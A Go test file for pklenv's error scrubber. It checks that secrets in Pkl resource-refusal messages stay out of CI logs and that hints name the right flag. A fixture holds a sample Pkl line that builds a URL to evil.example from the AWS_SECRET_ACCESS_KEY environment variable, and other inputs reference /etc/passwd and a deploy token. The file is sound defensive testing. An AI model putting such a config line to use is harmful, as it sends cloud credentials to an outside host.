package config

import (
	"errors"
	"strings"
	"testing"
)

// The shape Pkl produces, verified against pkl 0.32.1. The query string is the
// exfiltration attempt: a config builds a URL out of a secret so that fetching
// it delivers the secret to whoever is listening.
const exfilDiagnostic = `–– Pkl Error ––
Refusing to read resource ` + "`https://evil.example/?leak=AKIAsupersecret42`" + ` because it does not match any entry in the resource allowlist (` + "`--allowed-resources`" + `).

3 | ["X"] = read("https://evil.example/?leak=" + read("env:AWS_SECRET_ACCESS_KEY")).text
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
at env#vars["X"] (file:///tmp/env.pkl)
`

const secret = "AKIAsupersecret42"

// TestBlockedExfiltrationIsNotPrintedInstead is the point of the scrubber.
// pklenv refuses the fetch, so the only remaining way out for the secret is
// pklenv's own output — and a CI log is a copy that persists.
func TestBlockedExfiltrationIsNotPrintedInstead(t *testing.T) {
	e := &EvalError{File: "env.pkl", Err: errors.New(exfilDiagnostic)}

	// Both renderings matter: Summary is the CI path, Error is what --verbose
	// and a terminal get. Scrubbing only one would leave the guarantee holding
	// in exactly the place it is least needed.
	for name, got := range map[string]string{"Summary": e.Summary(), "Error": e.Error()} {
		if strings.Contains(got, secret) {
			t.Errorf("%s leaked the secret it just blocked:\n%s", name, got)
		}
		if !strings.Contains(got, "evil.example") {
			t.Errorf("%s should keep the origin, which is what the user needs for --allow-net:\n%s", name, got)
		}
	}
}

// TestSourceExcerptSurvives is why scrubbing costs nothing in debuggability.
// Pkl quotes the *expression*, not its result, so the line that caused the
// refusal is still readable — a concatenation shows as a concatenation.
func TestSourceExcerptSurvives(t *testing.T) {
	e := &EvalError{File: "env.pkl", Err: errors.New(exfilDiagnostic)}
	got := e.Error()
	if !strings.Contains(got, `read("env:AWS_SECRET_ACCESS_KEY")`) {
		t.Errorf("the source excerpt should be untouched:\n%s", got)
	}
}

func TestSafeURI(t *testing.T) {
	cases := map[string]string{
		// Origin kept, everything an attacker chooses discarded.
		"https://evil.example/?leak=" + secret: "https://evil.example/…",
		"https://evil.example/leak/" + secret:  "https://evil.example/…",
		"https://evil.example/x#" + secret:     "https://evil.example/…",
		"http://evil.example/?leak=" + secret:  "http://evil.example/…",
		"package://evil.example/pkg@1.0.0":     "package://evil.example/…",
		// Userinfo goes too, or credentials end up in the log.
		"https://user:pass@evil.example/x": "https://evil.example/…",

		// A filesystem path has no split between "where" and "what an attacker
		// filled in", so none of it survives.
		"file:///Users/someone/" + secret: "file:…",

		// An environment variable's name is the whole diagnostic, and a name is
		// not a value — pklenv already prints names in its warnings.
		"env:AWS_SECRET_ACCESS_KEY": "env:AWS_SECRET_ACCESS_KEY",
	}
	for uri, want := range cases {
		if got := safeURI(uri); got != want {
			t.Errorf("safeURI(%q) = %q, want %q", uri, got, want)
		}
	}
}

// TestOnlyRefusalsAreTouched keeps the scrubber narrow. Someone chasing a typo
// in a URL needs the whole URL, and an ordinary diagnostic is not shaped by an
// attacker.
func TestOnlyRefusalsAreTouched(t *testing.T) {
	ordinary := "Cannot find module `https://example.com/typo/PklEnv.pkl`."
	if got := scrubRefusals(ordinary); got != ordinary {
		t.Errorf("a non-refusal should pass through unchanged:\n got %q\nwant %q", got, ordinary)
	}
}

func TestHintsAddressTheRightFlag(t *testing.T) {
	cases := []struct {
		name string
		msg  string
		want string
	}{
		{
			"network refusal names the host",
			"Refusing to read resource `https://evil.example/?leak=x` because it does not match any entry in the resource allowlist (`--allowed-resources`).",
			"--allow-net=evil.example",
		},
		{
			// env: and https: are both resources, so keying off the allowlist
			// name alone would send an environment problem to --allow-net.
			"environment refusal names the variable",
			"Refusing to read resource `env:CI_DEPLOY_TOKEN` because it does not match any entry in the resource allowlist (`--allowed-resources`).",
			"--allow-env does not grant CI_DEPLOY_TOKEN",
		},
		{
			"root boundary refusal points at --root-dir",
			"Refusing to load module `file:///etc/passwd` because it is not within the root directory (`--root-dir`).",
			"--root-dir",
		},
		{
			"a plaintext origin keeps its scheme, since a bare host means https",
			"Refusing to load module `http://internal.example/x.pkl` because it does not match any entry in the module allowlist (`--allowed-modules`).",
			"--allow-net=http://internal.example",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := &EvalError{File: "env.pkl", Err: errors.New(tc.msg)}
			if got := e.Hint(); !strings.Contains(got, tc.want) {
				t.Errorf("Hint() = %q, want it to contain %q", got, tc.want)
			}
		})
	}
}
